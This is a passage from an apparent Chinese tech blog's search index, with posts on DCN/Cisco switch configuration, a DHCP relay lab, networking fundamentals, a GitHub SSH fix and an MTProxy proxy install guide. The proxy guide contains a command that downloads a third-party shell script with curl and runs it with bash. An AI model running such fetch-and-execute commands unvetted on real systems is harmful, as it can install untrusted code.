class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">DCRS(config)#spanning-tree</span><br><span class="line"></span><br><span class="line">DCRS(config)#spanning-tree mode mstp</span><br><span class="line"></span><br><span class="line">DCRS (config)#spanning-tree mst configuration //进入mst配置模式</span><br><span class="line"></span><br><span class="line">DCRS (config-mstp-region)#name DCN2011</span><br><span class="line"></span><br><span class="line">DCRS (config-mstp-region)#revision-level 1</span><br><span class="line"></span><br><span class="line">DCRS (config-mstp-region)#instance 1 vlan 10</span><br><span class="line"></span><br><span class="line">DCRS (config-mstp-region)#instance 2 vlan 20</span><br><span class="line"></span><br><span class="line">DCRS-6028(config)#interface ethernet 1/0/4-5</span><br><span class="line"></span><br><span class="line">DCRS-6028(config-if-port-range)#spanning-tree mst 1 rootguard</span><br><span class="line"></span><br><span class="line">DCRS-6028(config-if-port-range)#spanning-tree mst 2 rootguard</span><br><span class="line"></span><br><span class="line">DCRS-6028(config)#interface ethernet 1/0/7-12</span><br><span class="line"></span><br><span class="line">DCRS-6028(config-if-port-range)#spanning-tree portfast bpduguard</span><br><span class="line"></span><br><span class="line">AC:</span><br><span class="line"></span><br><span class="line">DCWS-6028(config)#interface ethernet 1/0/4 </span><br><span class="line"></span><br><span class="line">DCWS-6028(config-if-ethernet1/0/4)#spanning-tree mst 1 cost 2000000</span><br><span class="line"></span><br><span class="line">DCWS-6028(config)#interface ethernet 1/0/5</span><br><span class="line"></span><br><span class="line">DCWS-6028(config-if-ethernet1/0/5)#spanning-tree mst 2 cost 2000000</span><br></pre></td></tr></table></figure><h2 id="VRF-路由隔离"><a href="#VRF-路由隔离" class="headerlink" title="VRF {路由隔离}"></a>VRF {路由隔离}</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IP vrf &#123;vrfname&#125;   先创建一个实例</span><br><span class="line">IP vrf forwarding &#123;vrfname&#125;   在相应的vlan里调用实例 再配置地址</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Show IP vrf &#123;vrfname&#125;</span><br></pre></td></tr></table></figure><p><strong>例题：</strong>总部核心交换机DCRS既是内网核心交换机又模拟外网交换机，其上使用某种技术，将内网路由和internet路由隔离</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">show ip vrf internet</span><br><span class="line">interface Vlan2022</span><br><span class="line">ip vrf forwarding internet</span><br><span class="line">ip add 221.1.19.2 255.255.255.224</span><br><span class="line"></span><br><span class="line">interface Vlan2023</span><br><span class="line">ip vrf forwarding internet</span><br><span class="line">ip add 221.1.19.3 255.255.255.224</span><br></pre></td></tr></table></figure><h2 id="Show命令-部分"><a href="#Show命令-部分" class="headerlink" title="Show命令{部分}"></a><strong>Show命令</strong>{部分}</h2><h3 id="SNMP部分："><a href="#SNMP部分：" class="headerlink" title="SNMP部分："></a><strong>SNMP部分</strong>：</h3><p>show snmp status    snmp服务相关</p><p>show mac-notification summary   设置mac地址监听</p><h3 id="端口隔离部分："><a href="#端口隔离部分：" class="headerlink" title="端口隔离部分："></a><strong>端口隔离部分</strong>：</h3><p>show isolate-port group    端口隔离</p><p>show loopback-detection  环路检测</p><p>show ip dhcp snooping  监控dhcp 防止私设dhcp服务器</p>]]></content>
      
      
      <categories>
          
          <category> -计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -网络工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MTProxy+TLS安装{2.15代理IP被墙,此方法不再推荐使用}</title>
      <link href="/posts/18364.html"/>
      <url>/posts/18364.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>众所周知MTProxy如果直接直连几乎必被墙 所以这里加了一个TLS伪装 当然还是推荐配合白名单防火墙使用 具体教程<a href="https://mtproto.cc/self-host-proxy">如何自建防墙的白名单 MTProxy TLS 代理</a></p><p>下面开始MTProxy+TLS伪装教程 Github<a href="https://github.com/sunpma/mtp">地址</a></p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>先创建程序文件夹并进入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /home/mtproxy &amp;&amp; cd /home/mtproxy</span><br></pre></td></tr></table></figure><p>拉取脚本并安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s -o mtproxy.sh https://raw.githubusercontent.com/sunpma/mtp/master/mtproxy.sh &amp;&amp; chmod +x mtproxy.sh &amp;&amp; bash mtproxy.sh</span><br></pre></td></tr></table></figure><blockquote><p>若没有配置环境可以安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install git curl</span><br></pre></td></tr></table></figure></blockquote><p>配置界面清晰易懂就不再介绍了</p><p>所生成的TG一键链接 tg：xxxxxx直接复制到tg里面点开就能添加MTProxy代理了</p><p>脚本程序管理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">启动服务 bash mtproxy.sh start</span><br><span class="line">调试运行 bash mtproxy.sh debug</span><br><span class="line">停止服务 bash mtproxy.sh stop</span><br><span class="line">重启服务 bash mtproxy.sh restart</span><br><span class="line">修复常见问题 bash mtproxy.sh fix</span><br></pre></td></tr></table></figure><p>若有设置错误的地方 直接使用下面的卸载方法 重装就行 过程很快的</p><h1 id="卸载方法"><a href="#卸载方法" class="headerlink" title="卸载方法"></a>卸载方法</h1><p>直接删整个程序目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /home/mtproxy</span><br></pre></td></tr></table></figure><p>若要想设置开机自启</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/rc.local</span><br></pre></td></tr></table></figure><p>在系统自启文件中添加以下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash /home/mtproxy/mtproxy.sh start &gt; /dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -科学上网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科学那些事 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git上传报错问题解决</title>
      <link href="/posts/20538.html"/>
      <url>/posts/20538.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Git上传报错问题解决"><a href="#Git上传报错问题解决" class="headerlink" title="Git上传报错问题解决"></a>Git上传报错问题解决</h1><p>今天在进行博客美化的过程中遇到了一个报错，由于美化过程中一直用的本地部署进行预览效果，于是当我弄好准备推送到GitHub时出现了报错 如图<br><img src="/miximg/12.14.1.png" alt="avatar"></p><p>这里直接说解决方法</p><p>首先进行检查SSH服务是否连通</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>如果出现了报错</p><blockquote><p>ssh: connect to host github.com port 22: Connection timed out</p></blockquote><p>进行下一步 进入电脑存放ssh的目录 也就是存放id_rsa 等公钥和私钥的地方 查看公钥私钥文件是否存在  如果不存在 就需要去配置ssh服务</p><blockquote><p>ssh服务配置具体可以百度</p></blockquote><p>若存在 则在此目录下打开终端或者git-bash</p><p>建立新文件 config</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim config</span><br></pre></td></tr></table></figure><p>在config中插入以下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">User 你注册github的邮箱</span><br><span class="line">Hostname ssh.github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">Port 443</span><br></pre></td></tr></table></figure><p>保存退出即可</p><p>此时再次尝试连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>若出现提示 输入yes回车即可</p><p><img src="/miximg/12.14.2.png" alt="avatar"></p><p>连接成功 </p>]]></content>
      
      
      <categories>
          
          <category> -疑难杂症 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -问题解决 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次DHCP实验</title>
      <link href="/posts/48783.html"/>
      <url>/posts/48783.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="记一次DHCP实验"><a href="#记一次DHCP实验" class="headerlink" title="记一次DHCP实验"></a><strong>记一次DHCP实验</strong></h1><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>起因是云班课下发的DHCP实验作业<br><img src="/dhcpimg/1.png" alt="avatar"><br>按照题目搭建好了拓扑图将网络设备一一连接好，然后便开始正常配置<br>首先通过拓扑图可以发现这是一种<strong>基于三层交换机+路由器的DHCP拓扑图</strong></p><p>思科类似的大致有三种DHCP模型，分别是 <strong>基于三层交换机+路由器的DHCP拓扑图</strong>  <strong>基于三层交换机+服务器的DHCP拓扑图</strong>  以及 <strong>基于单臂路由+服务器的DHCP拓扑图</strong>   </p><p>我遇到的这种是第一种 </p><h2 id="基于三层交换机-路由器的DHCP拓扑图"><a href="#基于三层交换机-路由器的DHCP拓扑图" class="headerlink" title="基于三层交换机+路由器的DHCP拓扑图"></a>基于三层交换机+路由器的DHCP拓扑图</h2><h3 id="大体思路"><a href="#大体思路" class="headerlink" title="大体思路"></a>大体思路</h3><p><strong>路由器</strong>：<br>1、配置与三层交换机相连的端口IP<br>2、配置DHCP地址池<br>3、设置静态路由(即默认路由  主要是防止数据发不下去)   悄悄话【当三层交换机充当DHCP中继的时候 在vlan中设置DHCP中继 ‘IP help-address x.x.x.x’ 这是下面的网络设备向上请求 路由器接收到后如果不设置一条默认路由指向下方三层交换机接口的话  数据是发不下去的】<br><strong>三层交换机</strong>:<br>1、配置vlan<br>2、给vlan端口配置IP (ip一般是作为网关)<br>3、把连向路由器的端口 打开三层功能(no switch) 并配置IP<br>4、进入vlan  然后配置DHCP中继 (<strong>这一步可以放到最后再配置</strong>) (IP helper-address x.x.x.x 这里的地址是路由器即DHCP服务器与你连接的那个出口端口地址)<br><strong>二层交换机</strong><br>1、配置vlan<br>2、将端口划进vlan<br>3、将与三层交换机相连的的端口配置为trunk模式  eg:这里其实有一点 三层交换机与其相连的端口也得设置为trunk模式 但目前的思科模拟器默认检测到一端是trunk另一端也会自动变化</p><p>大体思路就是这样   开整！！！ </p><h3 id="配置步骤"><a href="#配置步骤" class="headerlink" title="配置步骤"></a><strong>配置步骤</strong></h3><p>先按照这个拓扑图 大体都差不多<br><img src="/dhcpimg/2.png" alt="avatar"><br>我们先从二层交换机开始配置</p><h4 id="配置二层交换机"><a href="#配置二层交换机" class="headerlink" title="配置二层交换机"></a>配置二层交换机</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Switch&gt;ena</span><br><span class="line">Switch#conf t</span><br><span class="line">Switch(config)#vlan 10    //创建vlan10</span><br><span class="line">Switch(config)#vlan 20    //创建vlan20</span><br><span class="line">Switch(config)#interface fastEthernet 0/1</span><br><span class="line">Switch(config-if)#switchport mode access     </span><br><span class="line">Switch(config-if)#switchport access vlan 10    //将f0/1端口划分到vlan10</span><br><span class="line">Switch(config-if)#no shutdown </span><br><span class="line">Switch(config-if)#ex</span><br><span class="line">Switch(config)#interface fastEthernet 0/2</span><br><span class="line">Switch(config-if)#switchport mode access </span><br><span class="line">Switch(config-if)#switchport access vlan 20    //将f0/2端口划分到vlan20</span><br><span class="line">Switch(config-if)#no shutdown </span><br><span class="line">Switch(config-if)#ex</span><br><span class="line">Switch(config)#interface fastEthernet 0/24</span><br><span class="line">Switch(config-if)#switchport mode trunk        //设置Trunk模式</span><br></pre></td></tr></table></figure><h4 id="配置三层交换机"><a href="#配置三层交换机" class="headerlink" title="配置三层交换机"></a>配置三层交换机</h4><p>先创建vlan 并分配IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#vlan 10</span><br><span class="line">Switch(config)#vlan 20                         //创建vlan10 vlan20</span><br><span class="line">Switch(config)#interface vlan 10</span><br><span class="line">Switch(config-if)#ip address 192.168.10.254 255.255.255.0    //配置IP</span><br><span class="line">Switch(config-if)#ex</span><br><span class="line">Switch(config)#interface vlan 20</span><br><span class="line">Switch(config-if)#ip address 192.168.20.254 255.255.255.0</span><br><span class="line">Switch(config-if)#ex</span><br><span class="line">Switch(config)#interface fastEthernet 0/2</span><br><span class="line">Switch(config-if)#no switchport  //开启路由功能</span><br><span class="line">Switch(config-if)#ip address 10.0.0.1 255.255.255.0    </span><br><span class="line">Switch(config-if)#ex</span><br><span class="line">Switch(config)#ip routing   //开启路由转发功能</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#interface vlan 10</span><br><span class="line">Switch(config-if)#ip helper-address 10.0.0.2      //设置DHCP中继</span><br><span class="line">Switch(config)#interface vlan 20</span><br><span class="line">Switch(config-if)#ip helper-address 10.0.0.2      //同上</span><br></pre></td></tr></table></figure><h4 id="配置路由器"><a href="#配置路由器" class="headerlink" title="配置路由器"></a>配置路由器</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Router(config)#interface gigabitEthernet 0/0/0</span><br><span class="line">Router(config-if)#ip address 10.0.0.2 255.255.255.0</span><br><span class="line">Router(config)#ip dhcp pool vlan10  //创建地址池vlan10</span><br><span class="line">Router(dhcp-config)#network 192.168.10.0 255.255.255.0  //地址池</span><br><span class="line">Router(dhcp-config)#default-router 192.168.10.254   //默认网关</span><br><span class="line">Router(dhcp-config)#dns-server 114.114.114.114  //默认dns服务器</span><br><span class="line">Router(config)#ip dhcp pool vlan20 //创建地址池vlan20</span><br><span class="line">Router(dhcp-config)#network 192.168.20.0 255.255.255.0</span><br><span class="line">Router(dhcp-config)#default-router 192.168.20.254</span><br><span class="line">Router(dhcp-config)#dns-server 114.114.114.114</span><br><span class="line">Router(config)#ip route 0.0.0.0 0.0.0.0 10.0.0.1</span><br></pre></td></tr></table></figure><p>全部配置完成 让我们去验证一下 </p><p>打开pc查看DHCP是否可以启用<br><img src="/dhcpimg/3.png" alt="avatar"><br>验证完成 DHCP配置成功</p>]]></content>
      
      
      <categories>
          
          <category> -计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -网络工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络基础</title>
      <link href="/posts/52002.html"/>
      <url>/posts/52002.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="计算机网络基础"><a href="#计算机网络基础" class="headerlink" title="计算机网络基础"></a>计算机网络基础</h1><h2 id="网络概念"><a href="#网络概念" class="headerlink" title="网络概念"></a>网络概念</h2><h3 id="集线器"><a href="#集线器" class="headerlink" title="集线器"></a>集线器</h3><p><strong>集线器</strong>的英文称为“Hub”。集线器的主要功能是对接收到的信号进行再生整形放大，以扩大网络的传输距离，同时把所有节点集中在以它为中心的节点上。它工作于OSI(开放系统互联参考模型)参考模型第一层，即“<a href="https://baike.baidu.com/item/%E7%89%A9%E7%90%86%E5%B1%82/4329158">物理层</a>”。</p><p>在以太网中，如果某个CSMA&#x2F;CD网络上的两台计算机在同时通信时会发生冲突，那么这个CSMA&#x2F;CD网络就是一个<strong>冲突域</strong>（collision domain)。如果<a href="https://baike.baidu.com/item/%E4%BB%A5%E5%A4%AA%E7%BD%91/99684">以太网</a>中各个<a href="https://baike.baidu.com/item/%E7%BD%91%E6%AE%B5/11026985">网段</a>以集线器连接，因为不能避免冲突，所以它们仍然是一个冲突域。<strong>也就是连到一个hub上的所有节点处于一个冲突域中。</strong></p><h3 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h3><p><strong>交换机</strong>的出现<strong>隔离了冲突域</strong>，属于OSI第二层即<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82">数据链路层</a>设备。每台终端可以<strong>全双工</strong>方式发送数据，而且自己发送数据又不会影响到其它设备，不用再去侦听链路是否有别的设备再发送数据了。每个通信终端独享一条链路和端口。</p><h3 id="单播-unicast"><a href="#单播-unicast" class="headerlink" title="单播(unicast)"></a>单播(unicast)</h3><p>指封包在<a href="https://so.csdn.net/so/search?q=%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C&spm=1001.2101.3001.7020">计算机网络</a>的传输中，目的地址为单一目标的一种传输方式。它是现今网络应用最为广泛，通常所使用的网络协议或服务大多采用单播传输，例如一切基于TCP的协议。</p><h3 id="组播-multicast"><a href="#组播-multicast" class="headerlink" title="组播(multicast)"></a>组播(multicast)</h3><p>也叫多播， 多点广播或群播。 指把信息同时传递给一组目的地址。它使用策略是最高效的，因为消息在每条网络链路上只需传递一次，而且只有在链路分叉的时候，消息才会被复制。</p><h3 id="广播-broadcast"><a href="#广播-broadcast" class="headerlink" title="广播(broadcast)"></a>广播(broadcast)</h3><p>是一种信息的传播方式，指网络中的某一设备同时向网络中所有的其它设备发送数据，这个数据所能广播到的范围即为**广播域(Broadcast Domain)**。简单点说，广播域就是指网络中所有能接收到同样广播消息的设备的集合。</p><h3 id="广播风暴"><a href="#广播风暴" class="headerlink" title="广播风暴"></a>广播风暴</h3><p>广播风暴(broadcast storm)故障，即一个数据包或帧被传送到本地网段(由广播域定义)上的每个节点就是广播；网络上的广播帧由于被转发，数量急剧增加而出现正常网络通信的反常现象。广播风暴会占用相当可观的网络带宽，导致正常数据包无法正常运行。当广播数据充斥网络无法处理并占用大量网络带宽，导致正常业务不能运行，这就发生了广播风暴，造成局域网局部或整个网络瘫痪。</p><h3 id="虚拟局域网-VLAN"><a href="#虚拟局域网-VLAN" class="headerlink" title="虚拟局域网(VLAN)"></a>虚拟局域网(VLAN)</h3><p>是一组逻辑上的设备和用户，这些设备和用户并不受物理位置的限制，可以根据功能、部门及应用等因素将它们组织起来，相互之间的通信就好像它们在同一个网段中一样，由此得名虚拟局域网。同一个VLAN中的广播只有VLAN中的 成员才能听到，而不会传输到其他的VLAN中去，从而控制不必要的广播风暴的产生。</p><p><strong>一个VLAN就是一个广播域.如果你的核心交换机的所有的端口都在一个VLAN中，属于一个大的广播域。划分VLAN后每个VLAN一个广播域。</strong></p><h3 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h3><p><strong>路由器</strong>是一种基于网络层的互联设备，是连接两个或多个网络的硬件设备，在网络间起网关的作用，<strong>是读取每一个数据包中的地址然后决定如何传送的专用智能性的网络设备</strong>。它能够理解不同的协议，例如某个局域网使用的以太网协议，因特网使用的TCP&#x2F;IP协议。这样，路由器可以分析各种不同类型网络传来的数据包的目的地址，把非TCP&#x2F;IP网络的地址转换成TCP&#x2F;IP地址，或者反之；再根据选定的路由算法把各数据包按最佳路线传送到指定位置。所以路由器可以把非TCP&#x2F; IP网络连接到因特网上。</p><p><strong>路由器的功能：</strong></p><ul><li>隔绝广播，实现跨三层的数据互访</li><li>路由协议的支持、维护路由表</li><li>路由发现、路径选择及数据转发</li><li>流量管理</li><li>广域网接入、地址转换及特定的安全功能</li></ul><hr><h2 id="OSI-开发系统互联参考模型"><a href="#OSI-开发系统互联参考模型" class="headerlink" title="OSI(开发系统互联参考模型)"></a>OSI(开发系统互联参考模型)</h2><p><img src="/jwimg/1650891538381-2c3830fe-637d-42a7-be9b-ad5c01a409b4.png" alt="avatar"><br><strong>特点：</strong></p><ul><li>OSI模型每层都有自己的功能集</li><li>层与层之间相互独立又相互依靠</li><li>上层依赖于下层，下层为上层服务</li></ul><h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><p>为应用软件提供接口，使应用程序能够使用网络服务。协议：http(80)、ftp(20&#x2F;21)、pop3(110)、telnet(23)、dns(53)等</p><h3 id="表示层"><a href="#表示层" class="headerlink" title="表示层"></a>表示层</h3><p>数据的编解码、数据的加解密、数据的压缩解压缩。如ASCII、JPEG等</p><h3 id="会话层"><a href="#会话层" class="headerlink" title="会话层"></a>会话层</h3><p>负责建立、管理和终止表示层实体之间的会话连接；在设备或节点直接提供会话控制；在系统之间协调通信过程</p><h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p>数据成为段。负责将来自上层应用程序的数据进行分段和重组，并将它们组合为同样的数据流形式；提供端到端的数据传输服务。协议：tcp、udp</p><h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><p>数据成为包。定义了逻辑地址；分组寻址，负责将分组数据从源端传输到目的端；路由选择、维护路由表。设备：路由器</p><h3 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h3><p>数据成为帧。在不可靠的物理链路上，提供可靠的数据传输服务，把帧从一跳（节点）移动到另一跳（节点）；组帧、物理编址、流量控制、差错控制、接入控制。协议有：以太网、令牌环网、PPP、HDLC、Frame Relay 等;设备：交换机、网卡 、网桥</p><h3 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h3><p>数据成为位。定义接口和媒体的物理特性；定义比特的表示、数据传输速率、信号的传输模式（单工、半双工、全双工）；定义网络物理结构（网状、星型、环型、总线型等拓扑结构）；负责把逐个的比特从一跳（结点）移动到另一跳（结点）设备：集线器</p><hr><h2 id="TCP-x2F-IP协议"><a href="#TCP-x2F-IP协议" class="headerlink" title="TCP&#x2F;IP协议"></a>TCP&#x2F;IP协议</h2><p>TCP&#x2F;IP协议包括以下</p><p>传输协议：TCP，UDP</p><p>应用协议：HTTP，SMTP，FTP，TELNET，SNMP</p><p>路由控制协议：RIP，OSPF，BGP</p><p>网际协议：IP,ICMP,ARP</p><h3 id="TCP-x2F-IP分层模型"><a href="#TCP-x2F-IP分层模型" class="headerlink" title="TCP&#x2F;IP分层模型"></a>TCP&#x2F;IP分层模型</h3><p>应用层-&gt;传输层-&gt;网络互连层(互联网层)-&gt;网络接口层</p><h3 id="网络接口层"><a href="#网络接口层" class="headerlink" title="网络接口层"></a>网络接口层</h3><p>利用数据链路层进行通信，属于接口层。</p><h3 id="网络互连层"><a href="#网络互连层" class="headerlink" title="网络互连层"></a>网络互连层</h3><p>使用IP协议，基于IP地址转发分包数据。互联网层与传输层的功能通常由操作系统提供，尤其是路由器，它必须实现通过互联网层转发分组数据包的功能。此外，连接互联网的所有主机和路由器都必须实现IP功能，其他设备（网桥、中继器、集线器）就没必要实现IP或TCP的功能。</p><h4 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h4><p>IP是跨越网络传送数据包，使整个互联网都能收到数据的协议，使用IP地址作为主机的标识。IP还隐含了数据链路层的功能，通过IP通信的主机之间无论经过什么底层链路都能实现通信。虽然IP也是分组交换协议，但它不具有重发机制，是非可靠性传输协议。</p><h4 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h4><p>IP数据包在发送途中发生异常，需要给发送端发送一个发生异常的通知，有时也用来诊断网络健康状况</p><h4 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h4><p>从分组数据包的IP地址中解析出物理地址（MAC）的协议。</p><h3 id="传输层-1"><a href="#传输层-1" class="headerlink" title="传输层"></a>传输层</h3><p>主要功能是让应用程序之间实现通信。计算机内部通常同一时间运行多个程序，必须用端口号识别是哪些程序和哪些程序在通信。有两个具有代表性的协议：TCP和UDP。</p><h4 id="TCP-传输控制协议"><a href="#TCP-传输控制协议" class="headerlink" title="TCP(传输控制协议)"></a>TCP(传输控制协议)</h4><p>面向连接(发送数据前会确认是否通畅)</p><p>可靠传输(丢包了等重新连接后会重传数据包)</p><p>流控及窗口机制</p><p>使用TCP的应用: Web浏览器；电子邮件 ；文件传输程序</p><h4 id="UDP-用户数据报协议"><a href="#UDP-用户数据报协议" class="headerlink" title="UDP(用户数据报协议)"></a>UDP(用户数据报协议)</h4><p>面向无连接(不确认直接发数据)</p><p>不可靠传输(丢包了不管直接继续发数据)</p><p>尽力而为的传输</p><p>使用UDP的应用：域名系统(DNS)；视频流；IP语音(VoIP)</p><h3 id="应用层-1"><a href="#应用层-1" class="headerlink" title="应用层"></a>应用层</h3><p>TCP&#x2F;IP中，会话层、表示层、应用层的功能都集中在应用程序实现，有时由一个单一程序实现，有时由多个程序实现。TCP&#x2F;IP应用的架构绝大多数属于客户端&#x2F;服务端模型，提供服务的程序预先部署到主机上，等待接收任何时刻客户可能发送的请求。客户端可以随时发送请求给服务端，有时服务端可能出现异常、超出负载等情况，这时客户端可以在等待片刻后重发一次请求。</p><h4 id="WWW"><a href="#WWW" class="headerlink" title="WWW"></a>WWW</h4><p>是互联网能够如此普及的一个重要原动力，用户在Web浏览器上借助鼠标键盘就能轻松发送各种请求给远端服务器，显示文字、图片、视频，播放声音等。浏览器和服务端之间通信协议是HTTP（HyperText Transfer Protocol），所传输的数据主要是HTML（HyperText Markup Language）。HTTP属于OSI应用层协议，HTML属于表示层协议。</p><h4 id="E-Mail"><a href="#E-Mail" class="headerlink" title="E-Mail"></a>E-Mail</h4><p>电子邮件就是不管距离多远的人，只要连在互联网，就能在网上相互发送邮件，用到的协议角坐SMTP（Simple Mail Transfer Protocol）。最初只能发送文本格式，后来由MIME协议扩展后，可以发送声音、图像等各种信息。MIME也是表示层协议。</p><h4 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h4><p>文件传输是指将计算机本地的文件传输到其他计算机上，使用的协议是FTP（File Transfer Protocol），传输过程中可以选择用二进制方式还是文本方式。在FTP中传输文件时会建立两个TCP连接，分别是传输请求时要用的控制连接和世纪传输数据时所用的数据连接。</p><h4 id="TELNET和SHH"><a href="#TELNET和SHH" class="headerlink" title="TELNET和SHH"></a>TELNET和SHH</h4><p>远程登陆是指登录到远程计算机，使得那台计算机的程序得以运行的一种功能，通常使用TELNET和SHH两种协议。</p><h4 id="SNMP"><a href="#SNMP" class="headerlink" title="SNMP"></a>SNMP</h4><p>在TCP&#x2F;IP进行网络管理时，采用SNMP（Simple Network Management Protocol）协议，使用SNMP管理的主机、网桥、路由器等称作SNMP代理（Agent），而进行管理的那一段叫管理器（Manager）。SNMP就是Agent与Manager用到的协议。</p><h3 id="TCP-x2F-IP通信"><a href="#TCP-x2F-IP通信" class="headerlink" title="TCP&#x2F;IP通信"></a>TCP&#x2F;IP通信</h3><p>包装过程：</p><p>应用层data.payload(数据)-&gt;传输层UDP.segment(数据段)-&gt;网络层IP.packet(数据包)-&gt;数据链路层MAC.frame(数据帧)</p><p><img src="/jwimg/1650893986341-8d7d4077-97f2-4d82-98e8-b5f380a7c53e.png" alt="avatar"></p><hr><h2 id="IP子网划分"><a href="#IP子网划分" class="headerlink" title="IP子网划分"></a>IP子网划分</h2><p><img src="/jwimg/1650894033788-3fc3060e-633c-40df-95dc-4b31343dc698.png" alt="avatar"></p><hr><hr><h1 id="路由"><a 